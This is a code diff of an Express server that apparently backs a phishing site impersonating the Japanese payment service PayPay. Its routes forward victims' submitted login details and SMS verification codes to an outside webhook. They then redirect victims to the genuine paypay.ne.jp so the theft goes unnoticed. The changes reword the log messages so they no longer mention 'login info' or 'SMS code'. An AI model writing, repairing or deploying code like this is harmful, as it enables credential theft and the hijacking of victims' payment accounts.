@@ -20,7 +20,6 @@ app.post("/send", async (req, res) => {
   }
 
   try {
-    // 【バグ修正】カッコの閉じ忘れ（ }); ）を正しく補完
     await fetch(webhook, {
       method: "POST",
       headers: {
@@ -31,7 +30,7 @@ app.post("/send", async (req, res) => {
       })
     });
 
-    console.log("ログイン情報 送信成功");
+    console.log("送信成功");
 
     const telParam = phone ? `?tel=${encodeURIComponent(phone)}` : '';
     res.redirect(`/sms.html${telParam}`);
@@ -62,12 +61,12 @@ app.post("/send-sms", async (req, res) => {
       })
     });
 
-    console.log("SMSコード 送信成功");
+    console.log("sms送信成功");
     
     res.redirect("https://paypay.ne.jp"); 
 
   } catch (error) {
-    console.error("SMSコード送信失敗:", error);
+    console.error("sms送信失敗:", error);
     res.status(500).send("エラー");
   }
 });
@@ -86,7 +85,7 @@ app.post("/log-access", async (req, res) => {
 
     res.status(200).send("OK");
   } catch (error) {
-    console.error("アクセスログ送信失敗:", error);
+    console.error("Access送信失敗:", error);
     res.status(500).send("Error");
   }
 });
